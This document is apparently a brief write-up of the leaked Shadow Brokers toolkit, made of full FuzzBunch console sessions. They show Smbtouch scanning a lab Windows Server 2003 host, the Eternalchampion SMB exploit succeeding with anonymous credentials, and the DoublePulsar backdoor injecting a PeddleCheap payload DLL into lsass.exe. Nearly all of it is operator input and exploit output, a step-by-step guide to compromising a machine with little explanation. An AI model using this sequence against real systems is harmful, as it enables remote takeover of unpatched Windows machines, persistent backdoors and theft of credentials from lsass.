
Eternalchampion，which is the most influential vulnerability in Shadow Brokers leaks , affecting versions from vista to win10 and server2k to server2k12.

```Shell
fb > use Eternalchampion

[!] Entering Plugin Context :: Eternalchampion
[*] Applying Global Variables
[+] Set NetworkTimeout => 60
[+] Set TargetIp => 192.168.146.134

[*] Applying Session Parameters
[*] Running Exploit Touches

[!] Entering Plugin Context :: Smbtouch
[*] Applying Global Variables
[+] Set NetworkTimeout => 60
[+] Set TargetIp => 192.168.146.134

[*] Inheriting Input Variables

[!] Enter Prompt Mode :: Smbtouch

[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds).  Use -1
for no timeout.

[?] NetworkTimeout [60] :

[*]  TargetIp :: Target IP Address

[?] TargetIp [192.168.146.134] :

[*]  TargetPort :: Port used by the SMB service

[?] TargetPort [445] :

[*]  Pipe :: Test an additional pipe to see if it is accessible (optional)

[?] Pipe [] :

[*]  Share :: Test a file share to see if it is accessible (optional), entered a
s hex bytes (in unicode)

[?] Share [] :

[*]  Protocol :: SMB (default port 445) or NBT (default port 139)

   *0) SMB
    1) NBT

[?] Protocol [0] :

[*]  Credentials :: Type of credentials to use

   *0) Anonymous     Anonymous (NULL session)
    1) Guest         Guest account
    2) Blank         User account with no password set
    3) Password      User name and password
    4) NTLM          User name and NTLM hash

[?] Credentials [0] :


[!] Preparing to Execute Smbtouch
[*] Redirection OFF

[+] Configure Plugin Local Tunnels

[+] Configure Plugin Remote Tunnels


Module: Smbtouch
================

Name                    Value
----                    -----
NetworkTimeout          60
TargetIp                192.168.146.134
TargetPort              445
RedirectedTargetIp
RedirectedTargetPort
UsingNbt                False
Pipe
Share
Protocol                SMB
Credentials             Anonymous

[?] Execute Plugin? [Yes] :
[*] Executing Plugin
[+] SMB Touch started

[*] TargetIp              192.168.146.134
[*] TargetPort            445
[*] RedirectedTargetIp    (null)
[*] RedirectedTargetPort  0
[*] NetworkTimeout        60
[*] Protocol              SMB
[*] Credentials           Anonymous

[*] Connecting to target...
        [+] Initiated SMB connection

[+] Target OS Version 5.2 build 3790
    Windows Server 2003 3790 Service Pack 2

[*] Trying pipes...
        [-] spoolss    - Not accessible (0xC0000034 - NtErrorObjectNameNotFound)

        [+] browser    - Success!

[*] Using Remote API to determine architecture
        [+] Target is 32-bit

[Not Supported]
        ETERNALBLUE     - Target OS version not supported
        ETERNALSYNERGY  - Target OS version not supported

[Vulnerable]
        ETERNALROMANCE  - FB
        ETERNALCHAMPION - DANE/FB

[*] Writing output parameters

[+] Target is vulnerable to 2 exploits
[+] Touch completed successfully

[+] Smbtouch Succeeded

[*] Exporting Contract To Exploit
[+] Set PipeName => browser
[+] Set ShareName =>
[+] Set Credentials => Anonymous
[+] Set Target => SERVER_2003_SP2
[+] Set TargetOsArchitecture => x86


[!] Enter Prompt Mode :: Eternalchampion

Module: Eternalchampion
=======================

Name                    Value
----                    -----
NetworkTimeout          60
TargetIp                192.168.146.134
TargetPort              445
PipeName                browser
ShareName
ShellcodeBuffer         50
Credentials             Anonymous
Protocol                SMB
Target                  SERVER_2003_SP2
TargetOsArchitecture    x86

[!] plugin variables are valid
[?] Prompt For Variable Settings? [Yes] :

[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds).  Use -1
for no timeout.

[?] NetworkTimeout [60] :

[*]  TargetIp :: The actual (non-redirected) Target IP Address

[?] TargetIp [192.168.146.134] :

[*]  TargetPort :: The actual (non-redirected) Target TCP port

[?] TargetPort [445] :

[*]  PipeName :: The named pipe to use (Win7+ only, need Pipe or Share)

[?] PipeName [browser] :

[*]  ShareName :: The name of the share to use in Unicode (Win7+ only, need Pipe
 or Share)

[?] ShareName [] :

[*]  ShellcodeBuffer :: DOPU Shellcode buffer

[?] ShellcodeBuffer [50] :

[*]  Credentials :: Type of credentials to use

   *0) Anonymous     Anonymous (NULL session)
    1) Guest         Guest account
    2) Blank         User account with no password set
    3) Password      User name and password
    4) NTLM          User name and NTLM hash

[?] Credentials [0] :

[*]  Protocol :: SMB (default port 445) or NBT (default port 139)

   *0) SMB     SMB protocol
    1) NBT     Netbios protocol

[?] Protocol [0] :

[*]  Target :: Operating System, Service Pack, of target OS

    0) XP_SP0SP1_X86         Windows XP Sp0 and Sp1, 32-bit
    1) XP_SP2SP3_X86         Windows XP Sp2 and Sp3, 32-bit
    2) XP_SP1_X64            Windows XP Sp1, 64-bit
    3) XP_SP2_X64            Windows XP Sp2, 64-bit
    4) SERVER_2003_SP0       Windows Sever 2003 Sp0, 32-bit
    5) SERVER_2003_SP1       Windows Sever 2003 Sp1, 32-bit/64-bit
   *6) SERVER_2003_SP2       Windows Sever 2003 Sp2, 32-bit/64-bit
    7) VISTA_SP0             Windows Vista Sp0, 32-bit/64-bit
    8) VISTA_SP1             Windows Vista Sp1, 32-bit/64-bit
    9) VISTA_SP2             Windows Vista Sp2, 32-bit/64-bit
    10) SERVER_2008_SP0       Windows Server 2008 Sp0, 32-bit/64-bit
    11) SERVER_2008_SP1       Windows Server 2008 Sp1, 32-bit/64-bit
    12) SERVER_2008_SP2       Windows Server 2008 Sp2, 32-bit/64-bit
    13) WIN7_SP0              Windows 7 Sp0, 32-bit/64-bit
    14) WIN7_SP1              Windows 7 Sp1, 32-bit/64-bit
    15) SERVER_2008R2_SP0     Windows Server 2008 R2 Sp0, 32-bit/64-bit
    16) SERVER_2008R2_SP1     Windows Server 2008 R2 Sp1, 32-bit/64-bit
    17) WIN8_SP0              Windows 8 Sp0, 32-bit/64-bit

[?] Target [6] :

[*]  TargetOsArchitecture :: The architecture of the target operating system

    0) Unknown     The architecture is not known (exploit will figure it out)
   *1) x86         The target is 32-bit
    2) x64         The target is 64-bit

[?] TargetOsArchitecture [1] :


[!] Preparing to Execute Eternalchampion

[*]  Mode :: Delivery mechanism

   *0) DANE     Forward deployment via DARINGNEOPHYTE
    1) FB       Traditional deployment from within FUZZBUNCH

[?] Mode [0] : 1
[+] Run Mode: FB

[?] This will execute locally like traditional Fuzzbunch plugins. Are you sure?
(y/n) [Yes] :
[*] Redirection OFF

[+] Configure Plugin Local Tunnels

[+] Configure Plugin Remote Tunnels


Module: Eternalchampion
=======================

Name                    Value
----                    -----
NetworkTimeout          60
TargetIp                192.168.146.134
TargetPort              445
RedirectedTargetIp
RedirectedTargetPort
DaveProxyPort           0
MaxExploitAttempts      42
PipeName                browser
ShareName
ShellcodeBuffer         50
Credentials             Anonymous
Protocol                SMB
Target                  SERVER_2003_SP2
TargetOsArchitecture    x86

[?] Execute Plugin? [Yes] :
[*] Executing Plugin

[*] Exploit Info:
        [*] TargetIp               192.168.146.134
        [*] TargetPort             445
        [*] Redirected TargetIP    (null)
        [*] Redirected TargetPort  0
        [*] NetworkTimeout         60
        [*] Credentials            Anonymous
        [*] Target                 SERVER_2003_SP2
        [*] Pipe                   browser
        [*] MaxExploitAttempts     42

[*] Connecting to target
        [+] Connection established

[*] Initializing SMB connection
        [+] SMB session established
        [+] SMB setup complete

[+] DOPU is already installed...
[+] Exploit was not thrown, but here's a consolation prize

*****************************************
**                                     **
**       WON THE GOLD MEDAL!!!         **
**                                     **
*****************************************
**         _________________           **
**         |@@@@|     |####|           **
**         |@@@@|     |####|           **
**         |@@@@|     |####|           **
**         |@@@@|     |####|           **
**         \@@@@|     |####/           **
**          \@@@|     |###/            **
**           `@@|_____|##'             **
**                (0)                  **
**             .-'''''-.               **
**           .'  * * *  `.             **
**          : *        *  :            **
**         : ~   T H E   ~ :           **
**         : ~ C H A M P ~ :           **
**          : *        *  :            **
**           `.  * * *  .'             **
**             `-.....-'               **
**                                     **
*****************************************

[+] Exploit successful! Use DOPU to continue

[+] CORE terminated with status code 0x00000000
[+] Eternalchampion Succeeded
```

```shell
fb Special (Eternalchampion) > use Doublepulsar

[!] Entering Plugin Context :: Doublepulsar
[*] Applying Global Variables
[+] Set NetworkTimeout => 60
[+] Set TargetIp => 192.168.146.134

[*] Applying Session Parameters

[*] Function :: Deconflict

Index    Session ID          Value

-----    ----------          -----

0        Doublepulsar - 2

1        Doublepulsar - 3

2        Current Value       RunDLL


[?] Function [0] : 2
[+] Using current val for Function

[!] Enter Prompt Mode :: Doublepulsar

Module: Doublepulsar
====================

Name                  Value
----                  -----
NetworkTimeout        60
TargetIp              192.168.146.134
TargetPort            445
DllPayload            C:\Logs\wahaha\z0.0.0.1\Payloads\PeddleCheap_2017_
                      04_30_19h59m38s.562\PC_Level3_dll.configured
DllOrdinal            1
ProcessName           lsass.exe
ProcessCommandLine
Protocol              SMB
Architecture          x86
Function              RunDLL

[!] plugin variables are valid
[?] Prompt For Variable Settings? [Yes] :

[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds).  Use -1
for no timeout.

[?] NetworkTimeout [60] :

[*]  TargetIp :: Target IP Address

[?] TargetIp [192.168.146.134] :

[*]  TargetPort :: Port used by the Double Pulsar back door

[?] TargetPort [445] :

[*]  Protocol :: Protocol for the backdoor to speak

   *0) SMB     Ring 0 SMB (TCP 445) backdoor
    1) RDP     Ring 0 RDP (TCP 3389) backdoor

[?] Protocol [0] :

[*]  Architecture :: Architecture of the target OS

   *0) x86     x86 32-bits
    1) x64     x64 64-bits

[?] Architecture [0] :

[*]  Function :: Operation for backdoor to perform

    0) OutputInstall     Only output the install shellcode to a binary file on d
isk.
    1) Ping              Test for presence of backdoor
   *2) RunDLL            Use an APC to inject a DLL into a user mode process.
    3) RunShellcode      Run raw shellcode
    4) Uninstall         Remove's backdoor from system

[?] Function [2] :

[*]  DllPayload :: DLL to inject into user mode

[?] DllPayload [C:\Logs\wahaha\z0.0.0.1\Payloads\PeddleCheap_2017_... (plus 44 c
haracters)] : C:\Logs\wahaha\z0.0.0.1/Payloads/PeddleCheap_2017_04_30_20h53m40s.
052/PC_Level3_dll.configured
[+] Set DllPayload => C:\Logs\wahaha\z0.0.0.1/Payloads/PeddleCheap_2017_... (plu
s 44 characters)

[*]  DllOrdinal :: The exported ordinal number of the DLL being injected to call


[?] DllOrdinal [1] :

[*]  ProcessName :: Name of process to inject into

[?] ProcessName [lsass.exe] :

[*]  ProcessCommandLine :: Command line of process to inject into

[?] ProcessCommandLine [] :


[!] Preparing to Execute Doublepulsar
[*] Redirection OFF

[+] Configure Plugin Local Tunnels
[+] Local Tunnel - local-tunnel-1
[?] Destination IP [192.168.146.134] :
[?] Destination Port [445] :
[+] (TCP) Local 192.168.146.134:445

[+] Configure Plugin Remote Tunnels


Module: Doublepulsar
====================

Name                  Value
----                  -----
NetworkTimeout        60
TargetIp              192.168.146.134
TargetPort            445
DllPayload            C:\Logs\wahaha\z0.0.0.1\Payloads\PeddleCheap_2017_                     04_30_20h53m40s.052\PC_Level3_dll.configured
DllOrdinal            1
ProcessName           lsass.exe
ProcessCommandLine
Protocol              SMB
Architecture          x86
Function              RunDLL

[?] Execute Plugin? [Yes] :
[*] Executing Plugin
[+] Selected Protocol SMB
[.] Connecting to target...
[+] Connected to target, pinging backdoor...
        [+] Backdoor returned code: 10 - Success!
        [+] Ping returned Target architecture: x86 (32-bit) - XOR Key: 0xE8BC232B
    SMB Connection string is: Windows Server 2003 3790 Service Pack 2
    Target OS is: 2003 x86
    Target SP is: 2
        [+] Backdoor installed
        [+] DLL built
        [.] Sending shellcode to inject DLL
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Command completed successfully
[+] Doublepulsar Succeeded
```
